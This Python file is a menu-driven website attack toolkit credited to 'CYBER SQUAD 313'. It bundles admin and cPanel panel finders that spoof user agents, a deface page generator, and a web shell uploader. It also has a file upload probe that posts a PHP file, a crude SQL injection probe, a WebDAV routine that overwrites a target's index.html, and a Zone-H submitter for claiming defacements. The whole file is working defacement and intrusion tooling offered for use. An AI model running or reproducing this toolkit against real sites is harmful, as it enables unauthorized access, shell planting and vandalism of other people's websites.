import os
import sys
import requests
import fake_useragent
from bs4 import BeautifulSoup
from rich.console import Console
from rich import print
import time

console = Console()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    console.print("""
[bold red]
  ______   ______  _____ ____    ____   ___  _   _   _    ____    _____ _ _____ 
 / ___\ \ / / __ )| ____|  _ \  / ___| / _ \| | | | / \  |  _ \  |___ // |___ / 
| |    \ V /|  _ \|  _| | |_) | \___ \| | | | | | |/ _ \ | | | |   |_ \| | |_ \ 
| |___  | | | |_) | |___|  _ <   ___) | |_| | |_| / ___ \| |_| |  ___) | |___) |
 \____| |_| |____/|_____|_| \_\ |____/ \__\_\___/_/   \_\|____/  |____/|_|____/ 
                                                                                 
[/bold red]
[cyan]        CYBER SQUAD 313 — "Securing the Truth. Hijacking the Lie — 313 Always On"[/cyan]
""")

def live_website_scanner():
    clear()
    banner()
    console.print("[bold cyan]Tool 1: Live Website Scanner[/bold cyan]\n")
    url = input("Enter URL list file path (e.g. urls.txt): ")
    if not os.path.exists(url):
        console.print("[red]File not found![/red]")
        return
    with open(url, "r") as f:
        for line in f:
            site = line.strip()
            try:
                r = requests.get(site, timeout=3)
                if r.status_code == 200:
                    console.print(f"[green][LIVE][/green] {site}")
                else:
                    console.print(f"[yellow][UNKNOWN][/yellow] {site}")
            except:
                console.print(f"[red][DOWN][/red] {site}")
    input("\nPress Enter to return to menu...")
    main_menu()

def admin_panel_finder():
    clear()
    banner()
    console.print("[bold cyan]Tool 2: Admin Panel Finder[/bold cyan]\n")
    target = input("Enter website URL (e.g., example.com): ")
    if not target.startswith("http"):
        target = "http://" + target
    paths = ['admin', 'admin/login', 'administrator', 'cpanel', 'login', 'adminarea']
    found = False
    for path in paths:
        url = f"{target}/{path}"
        try:
            headers = {'User-Agent': fake_useragent.UserAgent().random}
            res = requests.get(url, headers=headers, timeout=5)
            if res.status_code == 200:
                console.print(f"[green]Found Admin Panel: {url}[/green]")
                found = True
        except:
            pass
    if not found:
        console.print("[yellow]No admin panels found in default paths.[/yellow]")
    input("\nPress Enter to return to menu...")
    main_menu()

def deface_page_generator():
    clear()
    banner()
    console.print("[bold cyan]Tool 3: Deface Page Generator[/bold cyan]\n")
    title = input("Enter Deface Title: ")
    message = input("Enter Message: ")
    team = input("Enter Hacker/Team Name: ")
    html = f"""<html><head><title>{title}</title></head>
<body bgcolor=black><center><h1 style='color:red'>{message}</h1>
<h2 style='color:white'>~ {team}</h2></center></body></html>"""
    with open("deface.html", "w") as f:
        f.write(html)
    console.print("[green]Deface page saved as deface.html[/green]")
    input("\nPress Enter to return to menu...")
    main_menu()

def shell_uploader():
    clear()
    banner()
    console.print("[bold cyan]Tool 4: Shell Uploader[/bold cyan]\n")
    url = input("Enter vulnerable upload URL: ")
    shell_path = input("Enter shell file path (e.g., shell.php): ")
    if not os.path.exists(shell_path):
        console.print("[red]Shell file not found![/red]")
        return
    try:
        with open(shell_path, 'rb') as s:
            files = {'file': (os.path.basename(shell_path), s, 'application/octet-stream')}
            response = requests.post(url, files=files)
            console.print(f"[green]Upload status: {response.status_code}[/green]")
    except Exception as e:
        console.print(f"[red]Upload failed: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def file_upload_vuln_scanner():
    clear()
    banner()
    console.print("[bold cyan]Tool 5: File Upload Vulnerability Scanner[/bold cyan]\n")
    url = input("Enter URL with upload form: ")
    try:
        test_file = {'file': ('test.php', '<?php echo "vulnerable"; ?>')}
        r = requests.post(url, files=test_file)
        if r.status_code == 200 and "vulnerable" in r.text.lower():
            console.print("[red]Site may be vulnerable![/red]")
        else:
            console.print("[green]Not vulnerable or blocked.[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def link_grabber():
    clear()
    banner()
    console.print("[bold cyan]Tool 6: Link Grabber from URL[/bold cyan]\n")
    url = input("Enter target URL: ")
    try:
        headers = {'User-Agent': fake_useragent.UserAgent().random}
        r = requests.get(url, headers=headers)
        soup = BeautifulSoup(r.text, "html.parser")
        links = [a['href'] for a in soup.find_all('a', href=True)]
        for l in links:
            print(f"[green]{l}[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def sql_vuln_scanner():
    clear()
    banner()
    console.print("[bold cyan]Tool 7: SQL Vulnerability Scanner[/bold cyan]\n")
    url = input("Enter target URL (with parameter, e.g., site.com/page.php?id=1): ")
    payload = "'"
    try:
        r = requests.get(url + payload)
        if "sql" in r.text.lower() or "syntax" in r.text.lower():
            console.print("[red]Possible SQL Injection vulnerability found![/red]")
        else:
            console.print("[green]No SQL vulnerability detected.[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def cms_detector():
    clear()
    banner()
    console.print("[bold cyan]Tool 8: CMS Detector[/bold cyan]\n")
    url = input("Enter website URL (e.g., example.com): ")
    try:
        headers = {'User-Agent': fake_useragent.UserAgent().random}
        r = requests.get(url, headers=headers, timeout=5)
        if "wp-content" in r.text:
            console.print("[green]Detected CMS: WordPress[/green]")
        elif "Joomla" in r.text or "joomla" in r.text:
            console.print("[green]Detected CMS: Joomla[/green]")
        elif "Drupal" in r.text or "drupal" in r.text:
            console.print("[green]Detected CMS: Drupal[/green]")
        else:
            console.print("[yellow]CMS not detected[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def zoneh_submitter():
    clear()
    banner()
    console.print("[bold cyan]Tool 9: Zone-H Submitter[/bold cyan]\n")
    url = input("Enter defaced site URL: ")
    mirror = "http://www.zone-h.org/notify/single"
    data = {
        'defacer': 'cyber_alpha',
        'domain1': url,
        'hackmode': '15',
        'reason': '1'
    }
    try:
        r = requests.post(mirror, data=data)
        if "OK" in r.text or "done" in r.text.lower():
            console.print("[green]Zone-H submission sent![/green]")
        else:
            console.print("[yellow]Submission may have failed or needs login.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def webdav_exploit():
    clear()
    banner()
    console.print("[bold cyan]Tool 10: WebDAV Exploit[/bold cyan]\n")
    target = input("Enter target WebDAV URL: ")
    shell = input("Enter path to deface.html: ")
    if not os.path.exists(shell):
        console.print("[red]Shell file not found![/red]")
        return
    try:
        with open(shell, 'rb') as f:
            r = requests.put(target + "/index.html", data=f)
            if r.status_code in [200, 201, 204]:
                console.print("[green]Shell uploaded via WebDAV![/green]")
            else:
                console.print("[yellow]Upload failed or not supported.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    input("\nPress Enter to return to menu...")
    main_menu()

def cpanel_finder():
    clear()
    banner()
    console.print("[bold cyan]Tool 11: cPanel Finder[/bold cyan]\n")
    target = input("Enter website URL (e.g., example.com): ")
    if not target.startswith("http"):
        target = "http://" + target
    paths = ["/cpanel", "/admin", "/administrator", "/webmail", "/login", "/adminlogin"]
    found = False
    for path in paths:
        try:
            url = target + path
            headers = {'User-Agent': fake_useragent.UserAgent().random}
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code in [200, 301, 302]:
                console.print(f"[green]Found cPanel/Login page: {url}[/green]")
                found = True
        except:
            continue
    if not found:
        console.print("[yellow]No login panels found in default paths.[/yellow]")
    input("\nPress Enter to return to menu...")
    main_menu()

def developer_info():
    clear()
    banner()
    console.print("[bold cyan]Tool 12: Developer Info[/bold cyan]\n")
    console.print("[white]Developer: [green]CYBER ALPHA[/green]")
    console.print("[white]Team: [red]CYBER SQUAD 313[/red]")
    console.print("[white]Slogan: [magenta]Securing the Truth. Hijacking the Lie — 313 Always On[/magenta]")
    console.print("[white]Telegram: [blue]https://t.me/cyber_alpha_pk[/blue]")
    console.print("[white]Email: [cyan]alpha-0.2-pk@proton.me[/cyan]")
    input("\nPress Enter to return to menu...")
    main_menu()

def main_menu():
    clear()
    banner()
    console.print("""
[bold yellow]Choose a tool:[/bold yellow]
1. Live Website Scanner
2. Admin Panel Finder
3. Deface Page Generator
4. Shell Uploader
5. File Upload Vulnerability Scanner
6. Link Grabber from URL
7. SQL Vulnerability Scanner
8. CMS Detector
9. Zone-H Submitter
10. WebDAV Exploit
11. cPanel Finder
12. Developer Info
0. Exit
""")
    choice = input("Enter your choice: ")
    tools = {
        "1": live_website_scanner,
        "2": admin_panel_finder,
        "3": deface_page_generator,
        "4": shell_uploader,
        "5": file_upload_vuln_scanner,
        "6": link_grabber,
        "7": sql_vuln_scanner,
        "8": cms_detector,
        "9": zoneh_submitter,
        "10": webdav_exploit,
        "11": cpanel_finder,
        "12": developer_info,
        "0": exit
    }
    if choice in tools:
        tools[choice]()
    else:
        console.print("[red]Invalid choice![/red]")
        time.sleep(1)
        main_menu()

try:
    main_menu()
except KeyboardInterrupt:
    print("\n[red]Interrupted by user. Exiting...[/red]")
